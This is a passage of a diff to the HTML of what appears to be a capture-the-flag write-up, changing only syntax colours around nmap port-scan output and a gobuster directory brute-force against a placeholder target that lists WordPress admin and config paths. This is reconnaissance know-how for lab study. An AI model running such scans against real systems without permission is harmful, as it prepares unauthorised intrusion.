-</span></span><span style="display:flex;"><span>Completed Ping Scan at 12:12, 0.19s elapsed <span style="color:#000">(</span><span style="color:#1c01ce">1</span> total hosts<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of <span style="color:#1c01ce">1</span> host. at 12:12
-</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of <span style="color:#1c01ce">1</span> host. at 12:12, 0.01s elapsed
+</span></span><span style="display:flex;"><span>Scanning &lt;target-ip&gt; <span style="color:#ff79c6">[</span><span style="color:#bd93f9">4</span> ports<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>Completed Ping Scan at 12:12, 0.19s elapsed <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> total hosts<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of <span style="color:#bd93f9">1</span> host. at 12:12
+</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of <span style="color:#bd93f9">1</span> host. at 12:12, 0.01s elapsed
 </span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:12
-</span></span><span style="display:flex;"><span>Scanning &lt;target-ip&gt; <span style="color:#000">[</span><span style="color:#1c01ce">1000</span> ports<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>Scanning &lt;target-ip&gt; <span style="color:#ff79c6">[</span><span style="color:#bd93f9">1000</span> ports<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>Discovered open port 443/tcp on &lt;target-ip&gt;
 </span></span><span style="display:flex;"><span>Discovered open port 80/tcp on &lt;target-ip&gt;
-</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:12, 9.83s elapsed <span style="color:#000">(</span><span style="color:#1c01ce">1000</span> total ports<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:12, 9.83s elapsed <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1000</span> total ports<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>Initiating Service scan at 12:12
-</span></span><span style="display:flex;"><span>Scanning <span style="color:#1c01ce">2</span> services on &lt;target-ip&gt;
-</span></span><span style="display:flex;"><span>Completed Service scan at 12:13, 12.92s elapsed <span style="color:#000">(</span><span style="color:#1c01ce">2</span> services on <span style="color:#1c01ce">1</span> host<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>Scanning <span style="color:#bd93f9">2</span> services on &lt;target-ip&gt;
+</span></span><span style="display:flex;"><span>Completed Service scan at 12:13, 12.92s elapsed <span style="color:#ff79c6">(</span><span style="color:#bd93f9">2</span> services on <span style="color:#bd93f9">1</span> host<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>NSE: Script scanning &lt;target-ip&gt;.
 </span></span><span style="display:flex;"><span>Initiating NSE at 12:13
 </span></span><span style="display:flex;"><span>Completed NSE at 12:13, 2.82s elapsed
 </span></span><span style="display:flex;"><span>Initiating NSE at 12:13
 </span></span><span style="display:flex;"><span>Completed NSE at 12:13, 1.27s elapsed
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#a90d91">for</span> &lt;target-ip&gt;
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#000">(</span>0.15s latency<span style="color:#000">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#1c01ce">997</span> filtered tcp ports <span style="color:#000">(</span>no-response<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> &lt;target-ip&gt;
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff79c6">(</span>0.15s latency<span style="color:#ff79c6">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#bd93f9">997</span> filtered tcp ports <span style="color:#ff79c6">(</span>no-response<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>PORT    STATE  SERVICE  VERSION
 </span></span><span style="display:flex;"><span>22/tcp  closed ssh
 </span></span><span style="display:flex;"><span>80/tcp  open   http     Apache httpd
@@ -447,122 +447,122 @@ Methodology We begin our enumeration efforts by running an nmap scan on the targ
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
 </span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span>Nmap <span style="color:#a90d91">done</span>: <span style="color:#1c01ce">1</span> IP address <span style="color:#000">(</span><span style="color:#1c01ce">1</span> host up<span style="color:#000">)</span> scanned in 27.44 seconds
-</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#1c01ce">2007</span> <span style="color:#000">(</span>88.284KB<span style="color:#000">)</span> | Rcvd: <span style="color:#1c01ce">10</span> <span style="color:#000">(</span>416B<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff79c6">done</span>: <span style="color:#bd93f9">1</span> IP address <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> host up<span style="color:#ff79c6">)</span> scanned in 27.44 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#bd93f9">2007</span> <span style="color:#ff79c6">(</span>88.284KB<span style="color:#ff79c6">)</span> | Rcvd: <span style="color:#bd93f9">10</span> <span style="color:#ff79c6">(</span>416B<span style="color:#ff79c6">)</span>
 </span></span></code></pre></div><p>From this, we learn that an <code>Apache</code> instance is active on the standard ports, while an ssh server is running on port 22 - though it is closed to network traffic.</p>
 <p>Next, we use <code>gobuster</code>, <a href="https://github.com/OJ/gobuster">a popular tool</a> that facilitates brute-force enumeration. Here, we use it in directory mode (<code>dir</code>) with a popular directory names wordlist (<code>-w</code>) against our <code>&lt;target-ip&gt;</code> with (<code>-u</code>).</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -w /usr/share/wordlists/dirb/common.txt -u &lt;target-ip&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -w /usr/share/wordlists/dirb/common.txt -u &lt;target-ip&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
 </span></span><span style="display:flex;"><span>Gobuster v3.1.0
-</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#000">(</span>@TheColonial<span style="color:#000">)</span> &amp; Christian Mehlmauer <span style="color:#000">(</span>@firefart<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">===============================================================</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> Url:                     http://&lt;target-ip&gt;
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> Method:                  GET
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> Threads:                 <span style="color:#1c01ce">10</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> Negative Status codes:   <span style="color:#1c01ce">404</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> User Agent:              gobuster/3.1.0
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>+<span style="color:#000">]</span> Timeout:                 <span style="color:#000">10s</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">===============================================================</span>
-</span></span><span style="display:flex;"><span>2022/05/10 12:13:27 Starting gobuster in directory enumeration <span style="color:#000">mode</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">===============================================================</span>
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff79c6">(</span>@TheColonial<span style="color:#ff79c6">)</span> &amp; Christian Mehlmauer <span style="color:#ff79c6">(</span>@firefart<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Url:                     http://&lt;target-ip&gt;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Threads:                 <span style="color:#bd93f9">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Negative Status codes:   <span style="color:#bd93f9">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> User Agent:              gobuster/3.1.0
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Timeout:                 <span style="color:#8be9fd;font-style:italic">10s</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
+</span></span><span style="display:flex;"><span>2022/05/10 12:13:27 Starting gobuster in directory enumeration <span style="color:#8be9fd;font-style:italic">mode</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/.hta                 <span style="color:#000">(</span>Status: 403<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 213<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>/.hta                 <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 213<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#000">(</span>Status: 403<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 218<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 218<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#000">(</span>Status: 403<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 218<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 218<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/0                    <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/0/<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>/0                    <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/0/<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/admin                <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 235<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/admin/<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>/admin                <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 235<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/admin/<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/atom                 <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/feed/atom/<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>/atom                 <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/feed/atom/<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/audio                <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 235<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/audio/<span style="color:#000">]</span>  
+</span></span><span style="display:flex;"><span>/audio                <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 235<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/audio/<span style="color:#ff79c6">]</span>  
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/blog                 <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 234<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/blog/<span style="color:#000">]</span>   
+</span></span><span style="display:flex;"><span>/blog                 <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 234<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/blog/<span style="color:#ff79c6">]</span>   
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/css                  <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 233<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/css/<span style="color:#000">]</span>    
+</span></span><span style="display:flex;"><span>/css                  <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 233<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/css/<span style="color:#ff79c6">]</span>    
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/dashboard            <span style="color:#000">(</span>Status: 302<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/wp-admin/<span style="color:#000">]</span> 
+</span></span><span style="display:flex;"><span>/dashboard            <span style="color:#ff79c6">(</span>Status: 302<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/wp-admin/<span style="color:#ff79c6">]</span> 
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/favicon.ico          <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                      
+</span></span><span style="display:flex;"><span>/favicon.ico          <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span>                                      
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/feed                 <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span style="color:#000">]</span>     
+</span></span><span style="display:flex;"><span>/feed                 <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span style="color:#ff79c6">]</span>     
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/image                <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/image/<span style="color:#000">]</span>    
+</span></span><span style="display:flex;"><span>/image                <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/image/<span style="color:#ff79c6">]</span>    
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/Image                <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/Image/<span style="color:#000">]</span>    
+</span></span><span style="display:flex;"><span>/Image                <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/Image/<span style="color:#ff79c6">]</span>    
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/images               <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 236<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/images/<span style="color:#000">]</span> 
+</span></span><span style="display:flex;"><span>/images               <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 236<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/images/<span style="color:#ff79c6">]</span> 
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/index.html           <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 1188<span style="color:#000">]</span>                                   
+</span></span><span style="display:flex;"><span>/index.html           <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 1188<span style="color:#ff79c6">]</span>                                   
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/index.php            <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/<span style="color:#000">]</span>          
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/<span style="color:#ff79c6">]</span>          
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/intro                <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 516314<span style="color:#000">]</span>                                 
+</span></span><span style="display:flex;"><span>/intro                <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 516314<span style="color:#ff79c6">]</span>                                 
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/js                   <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 232<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/js/<span style="color:#000">]</span>     
+</span></span><span style="display:flex;"><span>/js                   <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 232<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/js/<span style="color:#ff79c6">]</span>     
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/license              <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 309<span style="color:#000">]</span>                                    
+</span></span><span style="display:flex;"><span>/license              <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 309<span style="color:#ff79c6">]</span>                                    
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/login                <span style="color:#000">(</span>Status: 302<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/wp-login.php<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>/login                <span style="color:#ff79c6">(</span>Status: 302<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/wp-login.php<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/page1                <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/<span style="color:#000">]</span>            
+</span></span><span style="display:flex;"><span>/page1                <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/<span style="color:#ff79c6">]</span>            
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/phpmyadmin           <span style="color:#000">(</span>Status: 403<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 94<span style="color:#000">]</span>                                       
+</span></span><span style="display:flex;"><span>/phpmyadmin           <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 94<span style="color:#ff79c6">]</span>                                       
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/readme               <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 64<span style="color:#000">]</span>                                       
+</span></span><span style="display:flex;"><span>/readme               <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 64<span style="color:#ff79c6">]</span>                                       
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/rdf                  <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/feed/rdf/<span style="color:#000">]</span>   
+</span></span><span style="display:flex;"><span>/rdf                  <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/feed/rdf/<span style="color:#ff79c6">]</span>   
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/robots               <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 41<span style="color:#000">]</span>                                       
+</span></span><span style="display:flex;"><span>/robots               <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 41<span style="color:#ff79c6">]</span>                                       
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/robots.txt           <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 41<span style="color:#000">]</span>                                       
+</span></span><span style="display:flex;"><span>/robots.txt           <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 41<span style="color:#ff79c6">]</span>                                       
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/rss                  <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span style="color:#000">]</span>       
+</span></span><span style="display:flex;"><span>/rss                  <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span style="color:#ff79c6">]</span>       
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/rss2                 <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span style="color:#000">]</span>       
+</span></span><span style="display:flex;"><span>/rss2                 <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span style="color:#ff79c6">]</span>       
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/sitemap              <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                        
+</span></span><span style="display:flex;"><span>/sitemap              <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span>                                        
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/sitemap.xml          <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                        
+</span></span><span style="display:flex;"><span>/sitemap.xml          <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span>                                        
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/video                <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 235<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/video/<span style="color:#000">]</span>    
+</span></span><span style="display:flex;"><span>/video                <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 235<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/video/<span style="color:#ff79c6">]</span>    
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/wp-admin             <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 238<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/wp-admin/<span style="color:#000">]</span> 
+</span></span><span style="display:flex;"><span>/wp-admin             <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 238<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/wp-admin/<span style="color:#ff79c6">]</span> 
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/wp-content           <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 240<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/wp-content/<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>/wp-content           <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 240<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/wp-content/<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/wp-includes          <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 241<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/wp-includes/<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>/wp-includes          <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 241<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/wp-includes/<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/wp-cron              <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                          
+</span></span><span style="display:flex;"><span>/wp-cron              <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span>                                          
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/wp-config            <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                          
+</span></span><span style="display:flex;"><span>/wp-config            <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span>                                          
